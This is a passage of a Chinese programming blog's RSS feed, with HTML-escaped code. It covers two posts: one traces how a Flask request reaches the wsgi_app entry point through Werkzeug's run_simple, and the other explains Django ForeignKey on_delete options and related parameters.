&lt;span class="n">wsgiserver&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">WSGIServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">app&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;5000&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">start&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>在 windows 下使用如下命令安装 wsgiserver&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">pip install wsgiserver
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后执行&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">python app.py
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="2-入口点">2. 入口点&lt;/h2>
&lt;p>看完 WSGI ，接下来看 Flask 请求的入口点在哪儿。&lt;/p>
&lt;h3 id="21-wsgi-server-与-run">2.1 WSGI Server 与 &lt;code>.run&lt;/code>&lt;/h3>
&lt;p>&lt;code>Flask&lt;/code>这个类定义于&lt;code>flask.app&lt;/code>，看这里的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_PackageBoundObject&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>先不去管 &lt;code>_PackageBoundObject&lt;/code> 是啥。我们知道 &lt;code>Flask&lt;/code>有一个&lt;code>run&lt;/code>方法可以快速启动服务，直接跳转到那儿。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/pallets/flask/blob/master/flask/app.py" target="_blank" rel="noopener"
>flask/app.py&lt;/a>
COMMIT a74864e , Line 844 ~ 949&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">debug&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">load_dotenv&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">options&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34; 略 &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="c1"># Change this into a no-op if the server is invoked from the&lt;/span>
&lt;span class="c1"># command line. Have a look at cli.py for more information.&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">environ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;FLASK_RUN_FROM_CLI&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;true&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">.debughelpers&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">explain_ignored_app_run&lt;/span>
&lt;span class="n">explain_ignored_app_run&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">get_load_dotenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">load_dotenv&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">cli&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">load_dotenv&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="c1"># if set, let env vars override previous values&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;FLASK_ENV&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">environ&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">env&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_env&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_debug_flag&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="s1">&amp;#39;FLASK_DEBUG&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">environ&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_debug_flag&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="c1"># debug passed to method overrides all other sources&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">debug&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">_host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;127.0.0.1&amp;#39;&lt;/span>
&lt;span class="n">_port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">5000&lt;/span>
&lt;span class="n">server_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;SERVER_NAME&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">sn_host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sn_port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">server_name&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">sn_host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sn_port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">server_name&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">partition&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">host&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">sn_host&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">_host&lt;/span>
&lt;span class="n">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">port&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">sn_port&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">_port&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">options&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setdefault&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;use_reloader&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">options&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setdefault&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;use_debugger&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">options&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setdefault&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;threaded&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">cli&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">show_server_banner&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">werkzeug.serving&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">run_simple&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">run_simple&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">options&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">finally&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1"># reset the first request information if the development server&lt;/span>
&lt;span class="c1"># reset normally. This makes it possible to restart the server&lt;/span>
&lt;span class="c1"># without reloader and that stuff from an interactive shell.&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_got_first_request&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>首先进入眼帘的是关于 flask/cli 的内容。 点进 &lt;code>explain_ignored_app_run&lt;/code> 可以得知这是一个防止用户犯蠢写下 app.run() 后又用 &lt;code>flask run&lt;/code>在命令行启动留下的说明性输出。&lt;/p>
&lt;p>其次是 dotenv 相关的玩意儿，没用过 dotenv 推荐去了解下 python-dotenv 这个包。可以很方便地配置好开发环境下的环境变量。&lt;/p>
&lt;p>经过一堆类型转换和检查之后，终于看到了这几行。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/pallets/flask/blob/master/flask/app.py" target="_blank" rel="noopener"
>flask/app.py&lt;/a>
COMMIT a74864e , Line 941 ~ 949&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="kn">from&lt;/span> &lt;span class="nn">werkzeug.serving&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">run_simple&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">run_simple&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">options&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">finally&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1"># reset the first request information if the development server&lt;/span>
&lt;span class="c1"># reset normally. This makes it possible to restart the server&lt;/span>
&lt;span class="c1"># without reloader and that stuff from an interactive shell.&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_got_first_request&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;code>run_simple&lt;/code>？这就是 WSGI Server 启动的地方了。&lt;/p>
&lt;p>&lt;a class="link" href="http://werkzeug.pocoo.org/docs/0.14/serving/" target="_blank" rel="noopener"
>看看 werkzeug 文档吧&lt;/a>，我这里摘一段。&lt;/p>
&lt;blockquote>
&lt;p>Serving WSGI Applications
There are many ways to serve a WSGI application. While you’re developing it, you usually don’t want to have a full-blown webserver like Apache up and running, but instead a simple standalone one. Because of that Werkzeug comes with a builtin development server.
The easiest way is creating a small start-myproject.py file that runs the application using the builtin server:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
&lt;span class="c1"># -*- coding: utf-8 -*-&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">werkzeug.serving&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">run_simple&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">myproject&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">make_app&lt;/span>
&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">make_app&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">run_simple&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8080&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">app&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">use_reloader&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>从函数签名可以看得出，&lt;code>run_simple&lt;/code>启动时，flask 将自己作为 wsgi app 参数传给了 werkzeug，不难猜测出，Flask 本身是一个可调用对象，即重写了 &lt;code>__call__&lt;/code> 方法。&lt;/p>
&lt;h3 id="22-__call__">2.2 &lt;code>__call__&lt;/code>&lt;/h3>
&lt;p>来到&lt;code>__call__&lt;/code>，发现它调用了&lt;code>self.wsgi_app&lt;/code>，本身没做任何事。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/pallets/flask/blob/master/flask/app.py" target="_blank" rel="noopener"
>flask/app.py&lt;/a>
COMMIT a74864e , Line 2323 ~ 2327&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__call__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">environ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">start_response&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;The WSGI server calls the Flask application object as the
&lt;/span>&lt;span class="s2"> WSGI application. This calls :meth:`wsgi_app` which can be
&lt;/span>&lt;span class="s2"> wrapped to applying middleware.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wsgi_app&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">environ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">start_response&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>再来到 &lt;code>wsgi_app&lt;/code> 的定义。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">wsgi_app&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">environ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">start_response&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34; 略 &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="n">ctx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">request_context&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">environ&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">error&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">ctx&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">push&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">full_dispatch_request&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">error&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">e&lt;/span>
&lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">handle_exception&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">except&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">error&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exc_info&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">raise&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">environ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">start_response&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">finally&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">should_ignore_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">error&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">error&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;span class="n">ctx&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">auto_pop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里，就是整个 Flask 作为 wsgi app，处理 request 的入口点了。&lt;/p>
&lt;p>从这儿我们能鸟瞰整个 flask 框架的核心逻辑。&lt;code>environ&lt;/code>被包装成 &lt;code>request&lt;/code>，压栈，&lt;code>full_dispatch_request&lt;/code>路由至视图，处理异常，一切结束后清栈。&lt;/p></description></item><item><title>Django 的各种关系字段详解</title><link>https://nnnewb.github.io/blog/p/django-%E7%9A%84%E5%90%84%E7%A7%8D%E5%85%B3%E7%B3%BB%E5%AD%97%E6%AE%B5%E8%AF%A6%E8%A7%A3/</link><pubDate>Wed, 06 Mar 2019 21:11:35 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/django-%E7%9A%84%E5%90%84%E7%A7%8D%E5%85%B3%E7%B3%BB%E5%AD%97%E6%AE%B5%E8%AF%A6%E8%A7%A3/</guid><description>&lt;blockquote>
&lt;p>参考资料如下&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://docs.djangoproject.com/zh-hans/2.1/ref/models/fields/" target="_blank" rel="noopener"
>Django 文档 - Model field reference&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://graycarl.me/2014/03/24/sqlalchemy-cascade-delete.html" target="_blank" rel="noopener"
>SQLAlchemy 中的级联删除&lt;/a>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h2 id="1-foreignkey">1. ForeignKey&lt;/h2>
&lt;p>&lt;code>ForeignKey&lt;/code>用于多对一关系，直接对应到数据库外键的概念。使用&lt;code>ForeignKey&lt;/code>需要指定引用的目标表，会自动关联到目标表的主键（一般是&lt;code>id&lt;/code>字段）。&lt;/p>
&lt;p>例子如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.db&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">models&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Parent&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">on_delete&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CASCADE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">)&lt;/span>
&lt;span class="c1"># ...&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Parent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="c1"># ...&lt;/span>
&lt;span class="k">pass&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>对比之 sqlalchemy，一行&lt;code>parent=models.ForeignKey(...)&lt;/code>包含了 sqlalchemy 中的&lt;code>ForeignKey&lt;/code>和&lt;code>relationship&lt;/code>两部分内容。&lt;/p>
&lt;h3 id="11-参数on_delete">1.1 参数：on_delete&lt;/h3>
&lt;p>&lt;code>on_delete&lt;/code>意为当&lt;code>ForeignKey&lt;/code>引用的对象被删除时进行的操作。&lt;/p>
&lt;p>有几个可以考虑的选项。&lt;/p>
&lt;h4 id="111-modelscascade">1.1.1 models.CASCADE&lt;/h4>
&lt;p>&lt;code>CASCADE&lt;/code>意为级联，&lt;code>on_delete&lt;/code>设置为&lt;code>CASCADE&lt;/code>时意为执行级联删除。依据文档，Django 会模仿 SQL 的&lt;code>ON DELETE CASCADE&lt;/code>，对包含了&lt;code>ForeignKey&lt;/code>的对象执行删除。&lt;/p>
&lt;p>需要注意的是不会调用被级联删除对象上的&lt;code>model.delete()&lt;/code>，但是会发送&lt;a class="link" href="https://docs.djangoproject.com/zh-hans/2.1/ref/signals/#django.db.models.signals.pre_delete" target="_blank" rel="noopener"
>&lt;code>pre_delete&lt;/code>&lt;/a>和&lt;a class="link" href="https://docs.djangoproject.com/zh-hans/2.1/ref/signals/#django.db.models.signals.post_delete" target="_blank" rel="noopener"
>&lt;code>post_delete&lt;/code>&lt;/a>信号。&lt;/p>
&lt;h4 id="1112-modelsprotect">1.1.1.2 models.PROTECT&lt;/h4>
&lt;p>&lt;code>PROTECT&lt;/code>意为保护，&lt;code>on_delete&lt;/code>设置为&lt;code>PROTECT&lt;/code>意味着要阻止删除操作发生。删除关联的对象时，&lt;code>ForeignKey&lt;/code>的&lt;code>on_delete&lt;/code>设置为&lt;code>PROTECT&lt;/code>会触发&lt;code>ProtectedError&lt;/code>。&lt;/p>
&lt;h4 id="1113-modelsset_null">1.1.1.3 models.SET_NULL&lt;/h4>
&lt;p>如其名所述，如果这个&lt;code>ForeignKey&lt;/code>是 nullable 的，则关联的对象删除时将外键设置为 null。&lt;/p>
&lt;h4 id="1114-modelsset_default">1.1.1.4 models.SET_DEFAULT&lt;/h4>
&lt;p>如其名所述，如果这个&lt;code>ForeignKey&lt;/code>设置了&lt;code>DEFAULT&lt;/code>，则关联的对象删除时设置这个外键为&lt;code>DEFAULT&lt;/code>值。&lt;/p>
&lt;h4 id="1115-modelsset">1.1.1.5 models.SET&lt;/h4>
&lt;p>在关联的对象删除时，设置为一个指定的值。这个参数可以接受一个可以赋值给这个 ForeignKey 的对象或者一个可调用对象。&lt;/p>
&lt;p>官方例子如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.conf&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">settings&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.contrib.auth&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">get_user_model&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.db&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">models&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">get_sentinel_user&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">get_user_model&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">objects&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_or_create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;deleted&amp;#39;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">MyModel&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">user&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="n">settings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">AUTH_USER_MODEL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">on_delete&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">get_sentinel_user&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="1116-modelsdo_nothing">1.1.1.6 models.DO_NOTHING&lt;/h4>
&lt;p>应该不用多说了吧。Django 不会做多余的事情，但是如果后端的数据库服务有强制完整性约束，除非你在数据库一端自己定义了&lt;code>ON DELETE&lt;/code>，否则会触发&lt;code>IntegrityError&lt;/code>。&lt;/p>
&lt;h3 id="12-参数limited_choice_to">1.2 参数：limited_choice_to&lt;/h3>
&lt;p>强制约束为 django.admin 或者 ModelForm 渲染时提供有限的可选项。&lt;/p>
&lt;p>接受参数为&lt;code>dict&lt;/code>或者&lt;code>Q&lt;/code>对象、返回&lt;code>Q&lt;/code>对象的可调用对象。&lt;/p>
&lt;p>官方例子。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">staff_member&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="n">User&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">on_delete&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CASCADE&lt;/span>&lt;span class="p">,&lt;/span>
